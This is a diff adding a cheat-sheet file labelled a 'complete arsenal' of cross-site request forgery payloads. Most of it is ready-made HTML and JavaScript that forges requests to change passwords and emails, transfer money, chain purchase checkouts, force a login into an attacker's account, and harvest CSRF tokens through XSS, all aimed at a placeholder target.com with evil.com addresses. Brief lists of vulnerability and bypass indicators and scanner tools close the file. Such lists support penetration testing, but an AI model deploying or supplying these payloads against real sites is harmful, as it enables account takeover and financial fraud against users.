@@ -1,0 +1,250 @@
+================================================================================
+CROSS-SITE REQUEST FORGERY (CSRF) PAYLOADS - COMPLETE ARSENAL
+================================================================================
+
+================================================================================
+BASIC HTML FORM CSRF PAYLOADS (POST Requests)
+================================================================================
+
+<form action="https://target.com/change-password" method="POST">
+<input name="password" value="hacked123">
+<input name="confirm_password" value="hacked123">
+</form>
+<script>document.forms[0].submit();</script> – Auto-submit form
+
+<form action="https://target.com/transfer" method="POST">
+<input name="amount" value="10000">
+<input name="to_account" value="attacker">
+</form>
+<script>document.forms[0].submit();</script> – Transfer funds CSRF
+
+<form action="https://target.com/email/change" method="POST">
+<input name="email" value="attacker@evil.com">
+</form>
+<script>document.forms[0].submit();</script> – Email change CSRF
+
+================================================================================
+BASIC HTML CSRF PAYLOADS (GET Requests)
+================================================================================
+
+<img src="https://target.com/logout"> – Logout via image
+<img src="https://target.com/delete-account?id=123"> – Delete account via image
+<img src="https://target.com/transfer?amount=1000&to=attacker"> – Transfer via image
+<link rel="stylesheet" href="https://target.com/delete-post?id=456"> – Delete via stylesheet
+<iframe src="https://target.com/follow?user=attacker"></iframe> – Follow via iframe
+
+================================================================================
+HIDDEN FORM CSRF PAYLOADS (Invisible)
+================================================================================
+
+<form action="https://target.com/settings" method="POST" style="display:none">
+<input name="email" value="attacker@evil.com">
+<input name="notifications" value="false">
+</form>
+<iframe name="hiddenFrame" style="display:none"></iframe>
+<script>document.forms[0].target="hiddenFrame";document.forms[0].submit();</script> – Hidden form with hidden iframe
+
+================================================================================
+MULTI-STEP CSRF PAYLOADS (Chain Forms)
+================================================================================
+
+<form action="https://target.com/cart/add" method="POST">
+<input name="product_id" value="123">
+<input name="quantity" value="999">
+</form>
+<form action="https://target.com/checkout" method="POST">
+<input name="address" value="attacker address">
+<input name="payment" value="COD">
+</form>
+<script>
+setTimeout(function() {
+    document.forms[0].submit();
+    setTimeout(function() {
+        document.forms[1].submit();
+    }, 1000);
+}, 500);
+</script> – Chain cart add + checkout
+
+================================================================================
+JSON CSRF PAYLOADS (Content-Type: application/json)
+================================================================================
+
+<form action="https://target.com/api/user" method="POST" enctype="text/plain">
+<input name='{"email":"attacker@evil.com","role":"admin"}' value=''>
+</form>
+<script>document.forms[0].submit();</script> – JSON CSRF via text/plain
+
+<form action="https://target.com/api/transfer" method="POST" enctype="text/plain">
+<input name='{"from":123,"to":456,"amount":10000}' value=''>
+</form>
+<script>document.forms[0].submit();</script> – JSON transfer CSRF
+
+================================================================================
+AJAX/FETCH CSRF PAYLOADS (JavaScript)
+================================================================================
+
+<script>
+fetch('https://target.com/change-password', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: 'password=hacked123&confirm=hacked123'
+});
+</script> – Fetch CSRF
+
+<script>
+fetch('https://target.com/api/transfer', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({to: 'attacker', amount: 10000})
+});
+</script> – JSON fetch CSRF
+
+<script>
+const xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://target.com/email/change', true);
+xhr.withCredentials = true;
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.send('email=attacker@evil.com');
+</script> – XMLHttpRequest CSRF
+
+================================================================================
+BLIND CSRF PAYLOADS (No User Interaction)
+================================================================================
+
+<img src="https://target.com/profile/delete" style="display:none"> – Hidden image
+<img src="x" onerror="fetch('https://target.com/delete-account')"> – Image error trigger
+<script src="https://target.com/logout"></script> – Script src CSRF
+
+================================================================================
+CSRF WITH CSRF TOKEN HARVESTING (XSS Chain)
+================================================================================
+
+<script>
+// First, fetch page to get CSRF token
+fetch('https://target.com/settings')
+  .then(r => r.text())
+  .then(html => {
+    let token = html.match(/name="csrf_token" value="([^"]+)"/)[1];
+    // Then submit with valid token
+    fetch('https://target.com/email/change', {
+      method: 'POST',
+      body: 'csrf_token=' + token + '&email=attacker@evil.com',
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'}
+    });
+  });
+</script> – Token harvesting via XSS
+
+================================================================================
+FLASH BASED CSRF PAYLOADS (Legacy, but still works on some sites)
+================================================================================
+
+<embed src="https://target.com/csrf.swf" style="display:none"> – Flash CSRF
+<object data="https://target.com/csrf.swf" type="application/x-shockwave-flash"></object> – Object flash CSRF
+
+================================================================================
+CSRF WITH WINDOW.OPEN / POPUP
+================================================================================
+
+<a href="https://target.com/transfer?amount=1000&to=attacker" target="_blank">Click here for prize</a> – Link with target blank
+
+<script>
+window.open('https://target.com/delete-account?id=123', '_blank');
+</script> – Popup CSRF
+
+================================================================================
+LOGIN CSRF PAYLOADS (Account Takeover)
+================================================================================
+
+<form action="https://target.com/login" method="POST">
+<input name="username" value="attacker_controlled">
+<input name="password" value="password123">
+<input name="remember" value="1">
+</form>
+<script>document.forms[0].submit();</script> – Login CSRF (victim logs in as attacker account)
+
+================================================================================
+LOGOUT CSRF PAYLOADS (Denial of Service)
+================================================================================
+
+<img src="https://target.com/logout"> – Simple logout CSRF
+<img src="https://target.com/auth/signout"> – Alternative logout
+<iframe src="https://target.com/logout"></iframe> – Iframe logout
+
+================================================================================
+EMAIL CHANGE CSRF PAYLOADS
+================================================================================
+
+<form action="https://target.com/profile/email" method="POST">
+<input name="email" value="hacker@evil.com">
+</form>
+<script>document.forms[0].submit();</script> – Email takeover
+
+<form action="https://target.com/api/user/email" method="POST" enctype="text/plain">
+<input name='{"email":"attacker@evil.com"}' value=''>
+</form>
+<script>document.forms[0].submit();</script> – JSON email change
+
+================================================================================
+PASSWORD CHANGE CSRF PAYLOADS
+================================================================================
+
+<form action="https://target.com/change-password" method="POST">
+<input name="current_password" value="oldpass123">
+<input name="new_password" value="hacked123">
+<input name="confirm_password" value="hacked123">
+</form>
+<script>document.forms[0].submit();</script> – Password reset CSRF (if current password not required)
+
+<form action="https://target.com/password/reset" method="POST">
+<input name="user_id" value="123">
+<input name="new_password" value="hacked123">
+</form>
+<script>document.forms[0].submit();</script> – Direct password reset (admin function)
+
+================================================================================
+PROFILE UPDATE CSRF PAYLOADS
+================================================================================
+
+<form action="https://target.com/profile/update" method="POST">
+<input name="full_name" value="Attacker Name">
+<input name="bio" value="Hacked by CSRF">
+<input name="website" value="https://evil.com">
+</form>
+<script>document.forms[0].submit();</script> – Profile takeover
+
+================================================================================
+CSRF RESPONSE INDICATORS (What to Look For)
+================================================================================
+
+Missing CSRF token – No protection
+CSRF token not validated – Token present but ignored
+Token in URL – Weak protection (leaks via referer)
+No SameSite cookie – Vulnerable to cross-origin requests
+GET request changes state – Very dangerous
+Token predictable – Sequential or timestamp-based
+
+================================================================================
+CSRF PROTECTION BYPASS INDICATORS
+================================================================================
+
+Token removed – Request still works
+Token replaced with blank – Works with blank token
+Token reused – Same token works across sessions
+Header removed – X-CSRF-Token not required
+Referer not checked – No referer validation
+Origin not checked – No origin validation
+
+================================================================================
+CSRF TOOL COMMANDS (For Reference)
+================================================================================
+
+Burp CSRF PoC Generator – Right click engagement tools
+csrfpopp – Automated CSRF PoC generation
+xsrfprobe – CSRF scanner
+OWASP CSRF Tester – Standalone tool
+
+================================================================================
+END OF CSRF PAYLOADS
+================================================================================
